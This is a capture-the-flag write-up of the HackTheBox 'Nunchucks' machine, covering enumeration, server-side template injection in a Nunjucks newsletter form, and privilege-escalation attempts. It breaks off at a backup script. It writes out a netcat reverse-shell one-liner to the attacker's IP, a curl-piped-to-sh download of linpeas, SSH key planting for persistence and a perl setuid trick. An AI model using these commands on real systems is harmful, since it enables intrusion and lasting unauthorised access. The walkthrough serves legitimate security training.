---
title: Write-up Nunchucks on HTB
author: eMVee
date: 2024-05-19 00:00:00 +0000
categories: [CTF, HTB]
tags: [HTB, SSTI, Capabilities, apparmor, OSWA, WEB200]
render_with_liquid: false
---

In this challenge, we will dive into the Nunchunks machine from HackTheBox. This machine is a great example of a modern web application, utilizing technologies such as Nginx, NodeJS, and Express. Through a series of steps, we will explore the application, identify vulnerabilities, and exploit them to gain a foothold and eventually root access. Let's get started!

## Getting started
First we should create a project folder and assign the IP address of our target to a variable.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mcd Nunchucks

┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ ip=10.129.95.252  
```
Now we are ready for enumeration.
## Enumeration
One of the first steps I like to do is to run a simple ping request to see if the target is responding to a ping request. Let's run the ping command.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ ping $ip -c3
PING 10.129.95.252 (10.129.95.252) 56(84) bytes of data.
64 bytes from 10.129.95.252: icmp_seq=1 ttl=63 time=5.81 ms
64 bytes from 10.129.95.252: icmp_seq=2 ttl=63 time=6.30 ms
64 bytes from 10.129.95.252: icmp_seq=3 ttl=63 time=5.96 ms

--- 10.129.95.252 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2017ms
rtt min/avg/max/mdev = 5.812/6.022/6.301/0.205 ms
```
Based on the answer in the `ttl` field we can assume that the target is running on a Linux operating system. Let's run a simple nmap port scan to identify open ports.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ nmap $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 10:17 CEST
Nmap scan report for 10.129.95.252
Host is up (0.017s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds

```
What do we know so far:
- Linux operating system
- Port 22
	- SSH
- Port 80
	- HTTP
- Port 443
	- HTTPS

Till now, we don't have any information that we could use for exploitation. So we should focus on enumeration till we know how we can exploit the target.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 10:17 CEST
Nmap scan report for 10.129.95.252
Host is up (0.0066s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/19%OT=22%CT=1%CU=36628%PV=Y%DS=2%DC=T%G=Y%TM=6649
OS:B5B5%P=x86_64-pc-linux-gnu)SEQ(SP=F8%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)S
OS:EQ(SP=FC%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FD%GCD=1%ISR=107%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST
OS:11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M5
OS:3CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%
OS:T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
OS:T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=
OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=1
OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   5.39 ms 10.10.14.1
2   5.89 ms 10.129.95.252

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.44 seconds

```

After a more detailed scan we did discover some more information. We should add this to our notes.
- Linux operating system, probably Ubuntu 20.04 Focal, this is based on this [information](https://packages.ubuntu.com/search?suite=default&section=all&arch=any&keywords=OpenSSH+8.2p1&searchon=all)
- Port 22
	- SSH
	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 
- Port 80
	- HTTP
	- nginx 1.18.0
	- Redirect to https://nunchucks.htb/
- Port 443
	- HTTPS
	- nginx 1.18.0


Since the redirect is not followed we should adjust it in the `/etc/hosts` file.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ sudo nano /etc/hosts 

┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# HTB
10.129.95.252   nunchucks.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
After updating the `/etc/hosts` file we can continue enumerating.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ whatweb http://$ip     
http://10.129.95.252 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.95.252], RedirectLocation[https://nunchucks.htb/], Title[301 Moved Permanently], nginx[1.18.0]
https://nunchucks.htb/ [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], Email[support@nunchucks.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.95.252], JQuery, Script, Title[Nunchucks - Landing Page], X-Powered-By[Express], nginx[1.18.0]

```
We did find some information that might be useful. We should add the following information to our notes.
- Email: support@nunchucks.htb
- Powered by: Express
- Title: Nunchucks - Landing Page

Let's use the goold old nikto. Sometimes the tool still find something useful, but often it does not find the vulnerability. But to be sure, we can start it.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ nikto -h http://$ip     
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.95.252
+ Target Hostname:    10.129.95.252
+ Target Port:        80
+ Start Time:         2024-05-19 10:22:44 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: https://nunchucks.htb/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2024-05-19 10:24:26 (GMT2) (102 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

We should investigate the website in a browser to see any functionality and read the website carefully. Before browsing to the website, we should start BurpSuite so it will capture any request we make to the website.

![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519103053.png){: width="700" height="400" }

It looks like a default template for a shop that want us start selling.

![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519103124.png){: width="700" height="400" }

There is a `Sign Up` page. Perhaps we can create our own account and logon to the application.

![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519103537.png){: width="700" height="400" }

The user registration is currently closed. So we are not able to register.
We did not enumerate any directories and files yet. So let's use dirsearch to enumerate this information.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ dirsearch -u http://$ip -e bak,old,php  
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                     
 (_||| _) (/_(_|| (_| )                                                                                                                                       
Extensions: bak, old, php | HTTP method: GET | Threads: 25 | Wordlist size: 10458

Output File: /home/emvee/Documents/HTB/Nunchucks/reports/http_10.129.95.252/_24-05-19_10-28-55.txt

Target: http://10.129.95.252/

[10:28:55] Starting:                                                                        
[10:29:18] 301 -  178B  - /axis//happyaxis.jsp  ->  https://nunchucks.htb/axis/happyaxis.jsp
[10:29:18] 301 -  178B  - /axis2-web//HappyAxis.jsp  ->  https://nunchucks.htb/axis2-web/HappyAxis.jsp
[10:29:18] 301 -  178B  - /axis2//axis2-web/HappyAxis.jsp  ->  https://nunchucks.htb/axis2/axis2-web/HappyAxis.jsp
[10:29:21] 301 -  178B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  https://nunchucks.htb/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[10:29:27] 301 -  178B  - /engine/classes/swfupload//swfupload_f9.swf  ->  https://nunchucks.htb/engine/classes/swfupload/swfupload_f9.swf
[10:29:26] 301 -  178B  - /engine/classes/swfupload//swfupload.swf  ->  https://nunchucks.htb/engine/classes/swfupload/swfupload.swf
[10:29:28] 301 -  178B  - /extjs/resources//charts.swf  ->  https://nunchucks.htb/extjs/resources/charts.swf
[10:29:31] 301 -  178B  - /html/js/misc/swfupload//swfupload.swf  ->  https://nunchucks.htb/html/js/misc/swfupload/swfupload.swf
                                                                             
Task Completed 
```

Nothing useful is found yet. Perhaps we should looks for a vhost (subdomain) to see if we can abuse something on a subdomain. We can use wfuzz to enumerate this information. First we have to run a basic scan to see the size of the response so we are able to filter a bit.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ wfuzz -H "Host: FUZZ.nunchucks.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  https://nunchucks.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nunchucks.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                    
=====================================================================

000000001:   200        546 L    2271 W     30587 Ch    "www"                      
000000003:   200        546 L    2271 W     30587 Ch    "ftp"                      
000000007:   200        546 L    2271 W     30587 Ch    "webdisk"                  
000000025:   200        546 L    2271 W     30587 Ch    "mail2"                    
000000026:   200        546 L    2271 W     30587 Ch    "vpn"                      
000000024:   200        546 L    2271 W     30587 Ch    "admin"                    
000000027:   200        546 L    2271 W     30587 Ch    "mx"                       
000000023:   200        546 L    2271 W     30587 Ch    "forum"       
```

We should filter the size `30587` since those are not interesting to us, the filter can be set with `--hh` followed by the size.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ wfuzz -H "Host: FUZZ.nunchucks.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 30587 https://nunchucks.htb 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nunchucks.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                    
=====================================================================

000000081:   200        101 L    259 W      4028 Ch     "store"                    

Total time: 22.34346
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 223.2867

```
We have identified a subdomain `store.nunchucks.htb`. We should add this to our `/etc/hosts` file again. This makes it possible for us to visit the website in the browser.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ sudo nano /etc/hosts
[sudo] password for emvee: 

┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ cat /etc/hosts                                                                                                                            
127.0.0.1       localhost
127.0.1.1       kali

# HTB
10.129.95.252   nunchucks.htb store.nunchucks.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

Now we should visit the subdomain in the browser.
![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519104350.png){: width="700" height="400" }

It looks like a landing page were we can register us for a newsletter.

![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519105321.png){: width="700" height="400" }

The email address entered in the field is reflected on the website. Perhaps we can inject a payload and it will be executed.

![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519105534.png){: width="700" height="400" }
The request was been captured by Burp Suite.

![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519105737.png){: width="700" height="400" }

Let's find out what technology is used according the famoust SSTI image.

![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519110212.png){: width="700" height="400" }

Based on the payload and the flow for SSTI technology identification, it looks like the technology is relying on Twig or Jinja2. Till now we don't have any clue yet what the relation is with the `X-Powered-By: Express`. Let's check if the `{7 * 7}` is not executed and reflected.


![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519110123.png){: width="700" height="400" }

It is not executed, so we should investigate the relation between Twig, Jinja2 and Express.
Let's use Google to find all template engines for expressjs.

![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519111848.png){: width="700" height="400" }

```
https://www.expressjs.com.cn/resources/template-engines.html
```

![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519111747.png){: width="700" height="400" }

On the website we can read the engine `Nunjucks`, this looks like the name of the box we are working on. So that explains a bit. As well why the Jinja2 and Twig payload are working in this template engine. Let's find a payload that executes our commands.

```
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks
```


![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519111205.png){: width="700" height="400" }
We can see a bit of the last part of the `/etc/passwd` file with tail. We can try to identify who is running this web application with `id` or `whoami`.

![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519111426.png){: width="700" height="400" }

The application is running as `David`. Let's try to get a reverse shell.
## Initial access

First we should start our netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ rlwrap nc -lvp 443
listening on [any] 443 ...
```

Our payload for a reverse shell looks like this.
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.17 443 >/tmp/f
```

Now we should send it with Burp.
![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519112918.png){: width="700" height="400" }

Let's check our reverse shell since Burp is still loading.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ rlwrap nc -lvp 443
listening on [any] 443 ...
connect to [10.10.14.17] from nunchucks.htb [10.129.95.252] 58938
bash: cannot set terminal process group (1008): Inappropriate ioctl for device
bash: no job control in this shell
david@nunchucks:/var/www/store.nunchucks$ 

```

We got a reverse shell as `David`! Now we should start enumerating the system again from the beginning.


```bash
david@nunchucks:/var/www/store.nunchucks$ whoami;id;hostname;ifconfig
whoami;id;hostname;ifconfig
david
uid=1000(david) gid=1000(david) groups=1000(david)
nunchucks

Command 'ifconfig' not found, but can be installed with:

apt install net-tools

Please ask your administrator.
david@nunchucks:/var/www/store.nunchucks$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:27:ad brd ff:ff:ff:ff:ff:ff
    inet 10.129.95.252/16 brd 10.129.255.255 scope global dynamic ens160
       valid_lft 2459sec preferred_lft 2459sec
    inet6 dead:beef::250:56ff:fe94:27ad/64 scope global dynamic mngtmpaddr 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:fe94:27ad/64 scope link 
       valid_lft forever preferred_lft forever
david@nunchucks:/var/www/store.nunchucks$ cd ~
cd ~
david@nunchucks:~$ ls -la
ls -la
total 52
drwxr-xr-x 7 david david 4096 Oct 22  2021 .
drwxr-xr-x 3 root  root  4096 Aug 28  2021 ..
lrwxrwxrwx 1 root  root     9 Aug 28  2021 .bash_history -> /dev/null
-rw-r--r-- 1 david david  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 david david 3771 Feb 25  2020 .bashrc
drwxr-xr-x 7 david david 4096 Sep 25  2021 .cache
drwx------ 8 david david 4096 Sep 25  2021 .config
drwx------ 3 david david 4096 Sep 25  2021 .gnupg
drwx------ 3 david david 4096 Sep 25  2021 .local
drwxrwxr-x 5 david david 4096 May 19 08:15 .pm2
-rw-r--r-- 1 david david  807 Feb 25  2020 .profile
-r--r----- 1 root  david   33 May 19 08:16 user.txt
-rw------- 1 david david 5116 Oct 22  2021 .viminfo
david@nunchucks:~$ cat user.txt
cat user.txt
< HERE IS THE USER FLAG!>

```

We should create a directory for the SSH service to store our public key.
```bash
david@nunchucks:~$ mkdir .ssh
mkdir .ssh
david@nunchucks:~$ cd .ssh
cd .ssh
```

Add the public key to victims machine.
```bash
david@nunchucks:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDO9tSgttCtaPc8tkLLD1Lybfp5SBVjlEFDL14V9foVXuNx48ptnOBhSIZZoe+2SBhASEDhYYU8YnSu+kxzIt0FSmGF78oyBhUWWZ4RROjiAJcyrC6czX/kmktIwOpxcB2FknbbBNAPNRcAYiy+k0aLeK3H/s1QMb0lMX2FrSXfPTHngExHa7xh+ZlVpy1Id819IwIQDeI3RAnU8tkY+yTRa3KbGyTWeoHL2a59o+Hf7BuVGnYJhmTK01DopYxLSHE+RoZO/SCBkfeBFO5zLQLU/yHBTV9T1dDyMnOjtQ+6jkInElqWvqr0Rn0FsmG5HokHb+SiD2FuVjXYDUF/L2O/vatrl+t7SILF0DNqjGLKNDjR3b28bOVKHQ3SEQRzj3WvdjwA6euFBi5DKKBvRilr0Try7MqscKdmvUMWwSJ0zzvl0fUNwyDCKT7vNFyurEWMGb/Cj2PZPvxx89jWm5RHs3TupYT/5PFaRRE1B0rZYoyCNRvMwgzdWKF6K2oGHaDl9dY67qwQnkJnNnjzhrIYeUkDontJnvSWwUTttGPUTMK9wyZVi6FnyNKPStCjSUenEAQiRqubJTFDr28ZwSzVlkcwgX2o6BrBGyd90QhlWm2BadaWO+bn1vh28XFJTgK1CnDWabo5namVgh3LsXXEHVwu2OH45Vui05MvbLTdLw== emvee' > authorized_keys
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDO9tSgttCtaPc8tkLLD1Lybfp5SBVjlEFDL14V9foVXuNx48ptnOBhSIZZoe+2SBhASEDhYYU8YnSu+kxzIt0FSmGF78oyBhUWWZ4RROjiAJcyrC6czX/kmktIwOpxcB2FknbbBNAPNRcAYiy+k0aLeK3H/s1QMb0lMX2FrSXfPTHngExHa7xh+ZlVpy1Id819IwIQDeI3RAnU8tkY+yTRa3KbGyTWeoHL2a59o+Hf7BuVGnYJhmTK01DopYxLSHE+RoZO/SCBkfeBFO5zLQLU/yHBTV9T1dDyMnOjtQ+6jkInElqWvqr0Rn0FsmG5HokHb+SiD2FuVjXYDUF/L2O/vatrl+t7SILF0DNqjGLKNDjR3b28bOVKHQ3SEQRzj3WvdjwA6euFBi5DKKBvRilr0Try7MqscKdmvUMWwSJ0zzvl0fUNwyDCKT7vNFyurEWMGb/Cj2PZPvxx89jWm5RHs3TupYT/5PFaRRE1B0rZYoyCNRvMwgzdWKF6K2oGHaDl9dY67qwQnkJnNnjzhrIYeUkDontJnvSWwUTttGPUTMK9wyZVi6FnyNKPStCjSUenEAQiRqubJTFDr28ZwSzVlkcwgX2o6BrBGyd90QhlWm2BadaWO+bn1vh28XFJTgK1CnDWabo5namVgh3LsXXEHVwu2OH45Vui05MvbLTdLw== emvee' > authorized_keys
```

Now we should set the correct permissions on the file.
```bash
david@nunchucks:~/.ssh$ chmod 600 authorized_keys
chmod 600 authorized_keys
david@nunchucks:~/.ssh$ 

```
Now we can logon with `David` via the SSH service.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ ssh david@$ip -i ~/.ssh/id_rsa 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-86-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 19 May 09:49:09 UTC 2024

  System load:             0.0
  Usage of /:              49.0% of 6.82GB
  Memory usage:            50%
  Swap usage:              0%
  Processes:               235
  Users logged in:         0
  IPv4 address for ens160: 10.129.95.252
  IPv6 address for ens160: dead:beef::250:56ff:fe94:27ad


10 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Oct 22 19:09:52 2021 from 10.10.14.6
david@nunchucks:~$ 

```
It looks like the system is running on `Ubuntu 20.04.3 `

Let's check if the user `David` can run anything as sudo.
```bash
david@nunchucks:~$ sudo -l
[sudo] password for david: 
Sorry, try again.
[sudo] password for david: 
Sorry, try again.
[sudo] password for david: 
sudo: 3 incorrect password attempts

```

Well, since we don't have any password for `David` we can not run this command (yet).
Let's host `linpeas` to enumerate automatically.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Nunchucks]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now let's download and run linpeas at once.
```bash
david@nunchucks:~$ curl -L http://10.10.14.17/linpeas.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                     
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                     
    |---------------------------------------------------------------------------------|                                                                                                                                                     
    |                                 Thank you!                                      |                                                                                                                                                     
    \---------------------------------------------------------------------------------/                                                                                                                                                     
          linpeas-ng by github.com/PEASS-ng                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                                                                                                              
                                                                                                                                                                                                                                            
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                                                                                                    
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
OS: Linux version 5.4.0-86-generic (buildd@lgw01-amd64-041) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #97-Ubuntu SMP Fri Sep 17 19:19:40 UTC 2021
User & Groups: uid=1000(david) gid=1000(david) groups=1000(david)
Hostname: nunchucks
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                     
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                     
```
Once the automatic scan is completed we should scroll through all the details and read it.

![Image](/assets/img/WriteUp/HTB/Nunchucks/Pasted image 20240519115919.png){: width="700" height="400" }

It looks like there are capabilities set to `perl`. We can use [GTFObins](https://gtfobins.github.io/gtfobins/perl/#capabilities) to see what we can use to gain access as root.
```bash
david@nunchucks:~$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
david@nunchucks:~$ id
uid=1000(david) gid=1000(david) groups=1000(david)
```
To bad, it did not work for us. Let's enumerate further.

```bash
david@nunchucks:~$ ls -la /opt
total 16
drwxr-xr-x  3 root root 4096 Oct 28  2021 .
drwxr-xr-x 19 root root 4096 Oct 28  2021 ..
-rwxr-xr-x  1 root root  838 Sep  1  2021 backup.pl
drwxr-xr-x  2 root root 4096 Oct 28  2021 web_backups
david@nunchucks:~$ cat /opt/backup.pl 
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
